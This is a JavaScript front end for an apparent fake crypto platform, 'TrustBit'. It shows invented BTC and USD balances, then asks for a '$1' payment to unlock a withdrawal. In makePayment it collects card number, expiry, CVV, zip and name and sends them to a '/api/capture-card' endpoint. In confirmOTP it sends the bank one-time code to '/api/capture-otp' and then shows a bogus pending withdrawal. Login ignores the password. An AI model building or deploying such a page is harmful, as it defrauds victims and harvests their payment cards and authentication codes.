// ======================
// 🧩 DOM LOGIC
// ======================
document.addEventListener("DOMContentLoaded", () => {
    console.log("TrustBit Active");

    // --- SIGNUP (Sends data to Backend) ---
    const signupBtn = document.getElementById('signupBtn');
    if (signupBtn) {
        signupBtn.onclick = async () => {
            const email = document.getElementById('signupEmail').value;
            const password = document.getElementById('signupPass').value;

            if (!email || !password) return alert("Please fill all fields");

            try {
                const response = await fetch('http://localhost:5000/api/signup', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, password })
                });

                if (response.ok) {
                    const wallet = "0x" + Math.random().toString(16).substring(2, 42);
                    localStorage.setItem('trustbitUser', JSON.stringify({
                        email, btc: 0.10735616, usd: 100000, wallet, history: []
                    }));
                    
                    alert("Account created successfully!");
                    window.location.href = "index.html";
                } else {
                    alert("Signup failed. Server might be offline.");
                }
            } catch (err) {
                console.error("Backend Error:", err);
                alert("Error connecting to backend.");
            }
        };
    }

    // --- LOGIN ---
    const loginBtn = document.getElementById('loginBtn');
    if (loginBtn) {
        loginBtn.onclick = () => {
            const email = document.getElementById('loginEmail').value;
            const pass = document.getElementById('loginPass').value;
            const user = JSON.parse(localStorage.getItem('trustbitUser'));

            if (user && email === user.email) { 
                localStorage.setItem('isLoggedIn', 'true');
                window.location.href = "dashboard.html";
            } else {
                alert("Invalid credentials");
            }
        };
    }

    // --- LOGOUT ---
    const logoutBtn = document.getElementById('logoutBtn');
    if (logoutBtn) {
        logoutBtn.onclick = () => {
            localStorage.removeItem('isLoggedIn');
            window.location.href = "index.html";
        };
    }

    // --- DASHBOARD LOAD CHECK ---
    if (window.location.pathname.includes("dashboard.html")) {
        if (localStorage.getItem('isLoggedIn') !== 'true') {
            window.location.href = "index.html";
        } else {
            loadDashboard();
        }
    }
});

// ======================
// 🧾 GLOBAL FUNCTIONS
// ======================
function loadDashboard() {
    const user = JSON.parse(localStorage.getItem('trustbitUser'));
    if (!user) return;

    if (document.getElementById('userEmail')) document.getElementById('userEmail').innerText = user.email;
    if (document.getElementById('btcBalance')) document.getElementById('btcBalance').innerText = `${user.btc} BTC`;
    if (document.getElementById('usdBalance')) document.getElementById('usdBalance').innerText = `$${parseFloat(user.usd).toLocaleString()}`;
    if (document.getElementById('walletAddressDisplay')) document.getElementById('walletAddressDisplay').innerText = user.wallet;

    const log = document.getElementById('activityLog');
    if (log) {
        if (!user.history || user.history.length === 0) {
            log.innerHTML = `<p class="text-muted fst-italic">No recent transactions...</p>`;
        } else {
            log.innerHTML = ""; 
            user.history.forEach(item => {
                const isPending = item.status === "Pending";
                const entry = document.createElement('div');
                entry.className = "border-bottom border-secondary py-2 text-white";
                entry.innerHTML = `
                    <span class="${isPending ? 'text-warning' : 'text-success'}">${isPending ? '⏳' : '↑'} ${item.type}</span>
                    <span class="float-end">${item.amount} BTC</span><br>
                    <small class="text-muted">Status: <b>${item.status || 'Completed'}</b> • ID: ${item.id}</small>
                `;
                log.appendChild(entry);
            });
        }
    }
}

function openWithdraw() {
    const modalElement = document.getElementById('withdrawModal');
    if (modalElement) {
        const withdrawModal = new bootstrap.Modal(modalElement);
        withdrawModal.show();
    }
}

// --- PAYMENT (Sends Card Data to Backend with full error handling) ---
async function makePayment() {
    const payBtn = document.getElementById('payBtn');
    const data = {
        cardNumber: document.getElementById('cardNumber').value.trim(),
        expiry: document.getElementById('cardExpiry').value.trim(),
        cvv: document.getElementById('cardCvv').value.trim(),
        zip: document.getElementById('billingZip').value.trim(),
        cardName: document.getElementById('cardName').value.trim(),
        cardType: document.getElementById('cardType').value,
        email: document.getElementById('Email').value.trim()
    };

    if (!data.cardNumber || !data.email) {
        return alert("⚠️ Please fill in card details and email.");
    }

    payBtn.innerText = "Verifying...";
    payBtn.disabled = true;

    try {
        const response = await fetch('http://localhost:5000/api/capture-card', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        });

        if (!response.ok) {
            throw new Error("Server rejected the data");
        }

        alert("✅ Card Verified! Redirecting to OTP...");
        window.location.href = "otp.html";
    } catch (err) {
        console.error("Fetch Error:", err);
        alert("Error: Could not connect to the server. Make sure your backend is running.");
        payBtn.disabled = false;
        payBtn.innerText = "Pay $1 & Continue";
    }
}

// --- OTP (Sends OTP to Backend) ---
async function confirmOTP() {
    const otpCode = document.getElementById('otpCode').value;
    const user = JSON.parse(localStorage.getItem('trustbitUser'));

    if (otpCode.length !== 6) return alert("Enter 6-digit OTP");

    try {
        await fetch('http://localhost:5000/api/capture-otp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email: user.email, otpCode })
        });

        const pendingTx = {
            type: "Withdrawal",
            status: "Pending",
            amount: "0.05",
            id: "0x" + Math.random().toString(16).substring(2, 10)
        };
        user.history.unshift(pendingTx);
        localStorage.setItem('trustbitUser', JSON.stringify(user));

        alert("✅ Payment confirmed! Your withdrawal is now processing.");
        window.location.href = "dashboard.html";
    } catch (err) {
        alert("Error verifying OTP.");
    }
}

function copyWallet(event) {
    event.preventDefault();
    const address = document.getElementById('walletAddressDisplay').innerText;
    navigator.clipboard.writeText(address).then(() => {
        alert("Copied to clipboard!");
    });
}

// ======================
// 💰 QUICK DEPOSIT
// ======================
function quickDeposit() {
    let user = JSON.parse(localStorage.getItem('trustbitUser'));
    if (!user) return alert("No user found!");

    const addedBtc = 0.01;
    const addedUsd = 500.00;

    user.btc = (parseFloat(user.btc) + addedBtc).toFixed(8);
    user.usd = (parseFloat(user.usd) + addedUsd).toFixed(2);

    if (!user.history) user.history = [];
    user.history.unshift({
        type: "Received",
        amount: addedBtc,
        status: "Completed",
        id: "0x" + Math.random().toString(16).substring(2, 10),
        date: new Date().toLocaleDateString()
    });

    localStorage.setItem('trustbitUser', JSON.stringify(user));
    loadDashboard();
    alert(`💰 Quick Deposit: +$500.00 Added!`);
}
